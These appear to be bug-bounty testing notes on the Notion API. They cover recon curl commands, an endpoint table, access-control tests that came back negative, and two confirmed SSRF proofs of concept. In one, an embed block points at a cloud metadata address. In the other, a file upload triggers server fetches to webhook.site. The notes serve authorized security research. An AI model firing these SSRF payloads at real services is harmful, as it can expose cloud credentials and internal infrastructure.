# Notion API Security Testing Case Study

**Target**: Notion Labs, Inc. — HackerOne bug bounty program  
**Token**: Personal Access Token (PAT)  
**Base URL**: `https://api.notion.com/v1`  
**Version header**: `Notion-Version: 2026-03-11`

## API Recon

```bash
# Get bot/user info
curl -s "https://api.notion.com/v1/users/me" -H "Authorization: Bearer *** -H "Notion-Version: 2026-03-11"

# List workspace users (email disclosure - documented behavior)
curl -s "https://api.notion.com/v1/users" -H "Authorization: Bearer *** -H "Notion-Version: 2026-03-11"

# Search accessible content
curl -s -X POST "https://api.notion.com/v1/search" -H "Authorization: Bearer *** -H "Notion-Version: 2026-03-11" -H "Content-Type: application/json" -d '{"query":""}'
```

## Token Security

**NEVER** put tokens in command-line arguments. They get logged in shell history, visible in process lists, and the write_file/tool tools may expose them. Always:

```bash
# Read from file (secure)
TOKEN=*** ~/.notion-token | tr -d '\n')

# Or env variable
export NOTION_TOKEN="ntn_..."
curl -s "https://api.notion.com/v1/users/me" -H "Authorization: Bearer ***NOTION_TOKEN" -H "Notion-Version: 2026-03-11"
```

## Key Endpoints

| Method | Endpoint | Purpose |
|--------|----------|---------|
| GET | `/v1/users/me` | Bot info |
| GET | `/v1/users` | List workspace users |
| GET | `/v1/users/{id}` | Get specific user |
| POST | `/v1/search` | Search content |
| GET | `/v1/pages/{id}` | Get page |
| PATCH | `/v1/pages/{id}` | Update page properties |
| GET | `/v1/blocks/{id}/children` | Get block children |
| PATCH | `/v1/blocks/{id}/children` | Append blocks |
| DELETE | `/v1/blocks/{id}` | Delete block |
| POST | `/v1/comments` | Create comment |
| GET | `/v1/comments` | List comments |
| POST | `/v1/file_uploads` | Create file upload (supports external_url mode) |
| GET | `/v1/file_uploads` | List file uploads |
| GET | `/v1/file_uploads/{id}` | Get file upload status |

## SSRF Vectors (Both Confirmed)

### 1. Embed/Bookmark SSRF
- **Endpoint**: `PATCH /v1/blocks/{id}/children`
- **Block types**: `embed`, `bookmark`, `image`, `video`, `audio`, `file`
- **URL scheme**: HTTP or HTTPS (no validation)
- **Infrastructure**:
  - NotionEmbedder (HEAD) from IP `131.149.232.x`
  - Iframely (GET) from IP `44.199.21.x` / `100.29.x.x`
- **PoC**:
```bash
curl -s -X PATCH "https://api.notion.com/v1/blocks/{page_id}/children" \
  -H "Authorization: Bearer *** \
  -H "Notion-Version: 2026-03-11" \
  -H "Content-Type: application/json" \
  -d '{"children":[{"object":"block","type":"embed","embed":{"url":"http://169.254.169.254.nip.io/latest/meta-data/"}}]}'
```

### 2. File Upload SSRF
- **Endpoint**: `POST /v1/file_uploads`
- **Mode**: `external_url`
- **URL scheme**: HTTPS only
- **Infrastructure**:
  - notion-api (HEAD) from IP `131.149.232.x`
  - notion (GET) from IP `131.149.232.x`
- **PoC**:
```bash
curl -s -X POST "https://api.notion.com/v1/file_uploads" \
  -H "Authorization: Bearer *** \
  -H "Notion-Version: 2026-03-11" \
  -H "Content-Type: application/json" \
  -d '{"mode":"external_url","parent":{"page_id":"{page_id}"},"external_url":"https://webhook.site/{uuid}/test","filename":"test.txt"}'
```

## Write Operations (Confirm Working)

All tested working on shared pages:
- PATCH page properties (title, icon, cover)
- Append block children (all block types)
- DELETE blocks
- POST comments
- Create child pages (automatically shared under parent)
- Archive/restore pages (`in_trash`)
- Lock/unlock pages (`is_locked`)

## Access Control (NOT Vulnerable)

| Test | Result |
|------|--------|
| Adjacent UUID enumeration | 404 — random UUIDs |
| Unshared workspace pages | 404 — properly isolated |
| Database/data_source access | 404 — not shared |
| Extra PATCH fields | 400 — no mass assignment |
| `javascript:` URLs in links | 400 — blocked |
| `data:` URLs in links | 400 — blocked |
| HTML/Script injection | Stored as text (React renders safely) |

## Rate Limiting

Notion enforces ~1 request/second (below the documented 3 req/s). Use delays between requests.

## Webhook Verification

See `references/ssrf-dns-bypass-techniques.md` for the webhook.site confirmation methodology used to verify these findings.
